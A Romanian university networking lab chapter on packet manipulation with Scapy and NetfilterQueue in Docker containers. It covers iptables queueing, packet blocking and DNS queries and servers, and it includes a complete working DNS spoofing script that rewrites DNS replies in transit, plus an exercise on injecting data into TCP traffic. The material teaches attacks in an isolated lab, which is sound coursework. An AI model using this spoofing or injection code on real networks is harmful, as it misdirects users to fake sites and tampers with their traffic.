# Capitolul 6 - Packet Manipulation

## Cuprins
- [Requrements](#intro)
- [Intercept Packages](#scapy_nfqueue)
    - [Intercepting Packets](#scapy_nfqueue_basic)
    - [Block Intercepted Packets](#scapy_nfqueue_block)
- [Exemple de protocoale în Scapy](#scapy)
  - [Domain Name System (DNS)](#scapy_dns)
    - [DNS Request](#scapy_dns_request)
    - [Micro DNS Server](#scapy_dns_server)
    - [DNS Spoofing](#scapy_dns_spoofing)
- [Exerciții](#exercitii)


<a name="intro"></a> 
## Introducere
**Important:** continuăm cu aceeași configurație ca în capitolul3 și urmărim secțiunea introductivă de acolo.
```
cd computer-networks

# ștergem toate containerele create default
docker-compose down

# ștergem rețelele create anterior ca să nu se suprapună cu noile subnets
docker network prune

# lucrăm cu docker-compose.yml din capitolul3
cd capitolul3
docker-compose up -d

# sau din directorul computer-networks: 
# docker-compose -f capitolul3/docker-compose.yml up -d
```



<a name="scapy_nfqueue"></a>
## [Netfilter Queue](https://pypi.org/project/NetfilterQueue/)
Pentru a modifica pachetele care circulă live pe rețeaua noastră, putem folosi librăria [NetfilterQueue](https://netfilter.org/projects/libnetfilter_queue/) care stochează pachetele într-o coadă. La citirea din coadă, pachetele pot fi acceptate (`packet.accept()`) pentru a fi transmise mai departe sau pot fi blocate (`packet.drop()`). În cazul în care dorim să le alterăm în timp real, putem folosi șiruri de octeți pentru a seta payload: `packet.set_payload(bytes(scapy_packet))`, unde payload reprezintă întregul pachet sub formă binară.
Mai multe exemple puteți găsi [în extensia de python](https://pypi.org/project/NetfilterQueue/).
Pentru a folosi librăria, trebuie să adăugăm o regulă în firewall-ul iptables prin care să redirecționăm toate pachetele către o coadă `NFQUEUE` cu un id specific. Acest lucru se poate face din shell:
```bash
# toate pachetele de la input se redirectioneaza catre coada 5
iptables -I INPUT -j NFQUEUE --queue-num 5
# toate pachetele spre output
iptables -I OUTPUT -j NFQUEUE --queue-num 5
# toate pachetele care sunt forwardate
iptables -I FORWARD -j NFQUEUE --queue-num 5


# stergem regula prin
iptables -D FORWARD 1
```
sau din python:
```python
import os
os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
```

<a name="scapy_nfqueue_basic"></a>
### Intercepting Packets
Setăm regula de iptables în funcție de locația de unde interceptăm pachete, dacă suntem pe aceiași mașină, rulăm redirecționarea pachetelor de la INPUT sau OUTPUT iar dacă suntem pe container router sau middle care au ca scop forwardarea pachetelor, folosim regula de FORWARD.

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os
```

Construim o funcție care modifică layer-ul de IP dintr-un pachet și setează tos = 3. Pentru end-points care au ECN enabled, acest număr setează biții de congestionare pe 11 care indică faptul că există o congestionare a rețelei.
```python
def alter_packet(pachet):
    '''Implementați asta ca exercițiu.
    # !atentie, trebuie re-calculate campurile len si checksum
    '''
    if pachet.haslayer(IP):        
        del pachet[IP].chksum
        del pachet[IP].len
        # pentru a obtine din nou len si chksum, facem rebuild
        # se face automat, de catre scapy
        # pachet = IP(pachet.build())
    return pachet
```

Construim o funcție care va fi apelată pentru fiecare pachet din coada NFQUEUE. În cadrul acestei funcții se apelează alter_packet care are ca scop modificarea conținutului pachetului în tranzit.
```python
def proceseaza(pachet):
    octeti = pachet.get_payload()
    scapy_packet = IP(octeti)
    print("Pachet inainte: ")
    scapy_packet.show()
    scapy_packet = alter_packet(scapy_packet)
    print("Pachet dupa: ")
    scapy_packet.show()
    pachet.set_payload(bytes(scapy_packet))
    pachet.accept()
```

Executăm comanda de iptables si bucla infită pe NFQUEUE.
```python
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()

```

<a name="scapy_nfqueue_block"></a>
### Blocarea unui IP
Ne atașăm containerului router:
```bash
docker-compose exec router bash
```

Dintr-un terminal de python sau dintr-un fișier rulăm:

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os
def proceseaza(pachet):
    # octeti raw, ca dintr-un raw socket
    octeti = pachet.get_payload()
    # convertim octetii in pachet scapy
    scapy_packet = IP(octeti)
    scapy_packet.summary()
    if scapy_packet[IP].src == '198.10.0.2':
        print("Drop la: ", scapy_packet.summary())
        pachet.drop()
    else:
        print("Accept la: ", scapy_packet.summary())
        pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
```

Într-un alt terminal ne atașăm containerului server:
```bash
docker-compose exec server bash
# nu va mai merge
ping router 
```


<a name="scapy"></a> 
## [Exemple de protocoale în Scapy](https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy)

<a name="scapy_dhcp"></a> 
### [Dynamic Host Configuration Protocol](http://www.ietf.org/rfc/rfc2131.txt) si [BOOTP](https://tools.ietf.org/html/rfc951)
- [bootstrap protocol](https://en.wikipedia.org/wiki/Bootstrap_Protocol) a fost înlocuit de [Dynamic Host Configuration Protocol](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol#Operation) pentru asignarea de adrese IPv4 automat device-urilor care se conectează pe rețea
- pentru cerere de IP flow-ul include pașii pentru discover, offer, request și ack
- container de docker [aici](https://github.com/networkboot/docker-dhcpd)
- [exemplu de cod scapy aici](https://github.com/senisioi/computer-networks/blob/2021/capitolul3/src/examples/dhcp.py)


<a name="scapy_dns"></a> 
### [Domain Name System](https://dnsmonitor.com/dns-tutorial-1-the-basics/)

DNS este un protocol la nivelul aplicației care este standardizat pentru UDP, port 53. Acesta se bazează pe request-response iar în cazul în care nu se primesc răspunsuri după un număr de reîncercări (de multe ori 2), programul anunță că nu poate găsi IP-ul pentru hostname-ul cerut ("can't resolve"). Headerul protocolului [este definit aici](http://www.networksorcery.com/enp/protocol/dns.htm).



<a name="scapy_dns_request"></a> 
#### Exemplu DNS request
```python
from scapy.all import *

# DNS request către google DNS
ip = IP(dst = '8.8.8.8')
transport = UDP(dport = 53)

# rd = 1 cod de request
dns = DNS(rd = 1)

# query pentru a afla entry de tipul 
dns_query = DNSQR(qname=b'fmi.unibuc.ro.', qtype=1, qclass=1)
dns.qd = dns_query

answer = sr1(ip / transport / dns)
print (answer[DNS].summary())
```

<a name="scapy_dns_server"></a> 
#### Micro DNS Server
Putem scrie un mic exemplu de aplicație care să funcționeze ca DNS care returnează [DNS A records](https://support.dnsimple.com/articles/a-record/). DNS rulează ca UDP pe portul 53:
```python
simple_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
simple_udp.bind(('0.0.0.0', 53))

while True:
    request, adresa_sursa = simple_udp.recvfrom(65535)
    # converitm payload-ul in pachet scapy
    packet = DNS(request)
    dns = packet.getlayer(DNS)
    if dns is not None and dns.opcode == 0: # dns QUERY
        print ("got: ")
        print (packet.summary())
        dns_answer = DNSRR(      # DNS Reply
           rrname=dns.qd.qname, # for question
           ttl=330,             # DNS entry Time to Live
           type="A",            
           rclass="IN",
           rdata='1.1.1.1')     # found at IP: 1.1.1.1 :)
        dns_response = DNS(
                          id = packet[DNS].id, # DNS replies must have the same ID as requests
                          qr = 1,              # 1 for response, 0 for query 
                          aa = 0,              # Authoritative Answer
                          rcode = 0,           # 0, nicio eroare http://www.networksorcery.com/enp/protocol/dns.htm#Rcode,%20Return%20code
                          qd = packet.qd,      # request-ul original
                          an = dns_answer)     # obiectul de reply
        print('response:')
        print (dns_response.summary())
        simple_udp.sendto(bytes(dns_response), adresa_sursa)
simple_udp.close()
```

Testați-l cu
```bash
dig @localhost fmi.unibuc.ro
```

<a name="scapy_dns_spoofing"></a> 
#### DNS Spoofing
Dacă intermediem conexiunea între două noduri, putem insera răspunsuri DNS malițioase cu scopul de a determina userii să acceseze pagini false. Pe linux, un DNS customizabil se poate set prin fișierul `/etc/resolv.conf` sau ca în [exemplul de aici](https://unix.stackexchange.com/questions/128220/how-do-i-set-my-dns-when-resolv-conf-is-being-overwritten)).

Presupunem că folosim configurația de containere definită în acest capitol, că ne aflăm pe containerul `router` și că monitorizăm toate cererile containerul `server`. În cazul în care observăm un pachet UDP cu portul destinație 53 (e.g., IP destinație 8.8.8.8), putem încerca să trimitem un reply care să pară că vine de la DNS (8.8.8.8) cu o adresă IP falsă care nu apraține numelui interogat de către server. 
E posibil ca reply-ul nostru să ajungă la containerul `server`, dar și reply-ul serverul DNS original (8.8.8.8) să ajungă tot la container. Pentru ca atacul să fie cât mai lin, cel mai sigur este să modificăm live răspunsurile DNS-ului original (8.8.8.8) după următoarele instrucțiuni ([sursa originală](https://www.thepythoncode.com/article/make-dns-spoof-python)):

##### 1. iptables forward către nfqueue
Ne atașăm containerului `router` pentru a ataca containerul `server`. Construim o regulă de iptables prin care toate pachetele care trebuie forwardate (-I FORWARD) să treacă prin regula NFQUEUE cu număr de identificare 10 (putem alege orice număr).
```bash
docker-compose exec router bash

iptables -I FORWARD -j NFQUEUE --queue-num 10
```
##### 2. Scriem o funcție care detectează și modifică pachete de tip DNS reply
Deschidem un terminal de python sau executăm `python3 /elocal/capitolul3/src/examples/dns_spoofing.py`:
```python
#!/usr/bin/env python3

from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

def detect_and_alter_packet(packet):
    """Functie care se apeleaza pentru fiecare pachet din coada
    """
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    # daca pachetul are layer de IP, UDP si DNSRR (reply)
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(UDP) and scapy_packet.haslayer(DNSRR):\
        # daca e site-ul fmi, apelam functia care face modificari
        if scapy_packet[DNSQR].qname == b'fmi.unibuc.ro.':
            print("[Before]:", scapy_packet.summary())
            # noul scapy_packet este modificat cu functia alter_packet
            scapy_packet = alter_packet(scapy_packet)
            print("[After ]:", scapy_packet.summary())
            # extragem octetii din pachet
            octets = bytes(scapy_packet)
            # il punem inapoi in coada modificat
            packet.set_payload(octets)
    # apelam accept pentru fiecare pachet din coada
    packet.accept()


def alter_packet(packet):
    # obtinem qname sau Question Name
    qname = packet[DNSQR].qname
    # construim un nou raspuns cu reply data
    packet[DNS].an = DNSRR(rrname=qname, rdata='1.1.1.1')
    # answer count = 1
    packet[DNS].ancount = 1
    # am modificat pachetul si stergem campurile len si checksum
    # in mod normal ar trebui recalculate, dar scapy face asta automat
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # returnam pachetul modificat
    return packet
```

##### 3. Executăm coada Netfilter cu funcția definită anterior
```python
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
```

Testați din containerul `server`: `docker-compose exec server bash -c "ping fmi.unibuc.ro"`

<a name="exercitii"></a> 
## Exerciții
1. Urmăriți mai multe exemple din scapy [aici](https://scapy.readthedocs.io/en/latest/usage.html#simple-one-liners)
2. Utilizați NetfilterQueue în containerul `router` pentru a intercepta pachete TCP dintre client și server și pentru a injecta mesaje suplimentare în comunicare.
